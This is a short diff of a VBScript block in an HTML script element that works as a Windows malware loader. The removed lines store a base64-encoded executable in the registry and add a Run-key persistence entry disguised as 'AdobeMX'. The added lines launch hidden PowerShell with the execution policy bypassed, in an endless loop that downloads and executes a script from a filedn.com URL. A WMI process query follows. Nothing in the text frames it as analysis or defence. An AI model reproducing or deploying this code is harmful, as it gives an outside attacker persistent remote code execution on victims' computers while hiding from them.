@@ -14,10 +14,12 @@
 	<script language="VBScript">
 		<![CDATA[
 		
-		  CreateObject("Wscript.Shell").regwrite "HKCU\Software\Valuex", "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEEAFBPyFkAAAAAAAAAAOAADgELAQYAAPwAAAAIAAAAAAAAjhsBAAAgAAAAIAEAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAQAABAAAAAAAAAIAAAAAABAAABAAAAAAEAAAEAAAAAAAAA4AAAAAAAAAAAAAAEAbAQBLAAAAAEABAEACAAAAAAAAAAAAAAAAAAAAAAAAAGABAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAlPsAAAAgAAAA/AAAAAQAAAAAAAAAAAAAAAAAACAAAGAuc2RhdGEAALEAAAAAIAEAAAIAAAAAAQAAAAAAAAAAAAAAAABAAADALnJzcmMAAABAAgAAAEABAAAEAAAAAgEAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAQAAAgAAAAYBAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAA" , "REG_SZ"
+		  CreateObject("Wscript.Shell").regwrite "HKCU\Software\?", "?" , "REG_SZ"
 set O = CreateObject("Wscript.Shell")
 U=O.ExpandEnvironmentStrings("%windir%")
-O.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AdobeMX", U & "\System32\cmd.exe /c start /min powershell $Null)" , "REG_SZ"
+O.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\?", U & "?" , "REG_SZ"
+ Set ws=CreateObject("WScript.Shell")
+ws.Run "cmd.exe /c start /min powershell -ExecutionPolicy Bypass -w hidden -c while($true){IEX((new-object net.webclient).downloadstring('https://filedn.com/l8WR7CI6Fagp3rvpUCNMA54/stub_pwshll.txt'))}", 0, vbhide
  
 Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 Dim colProcesses : Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process")
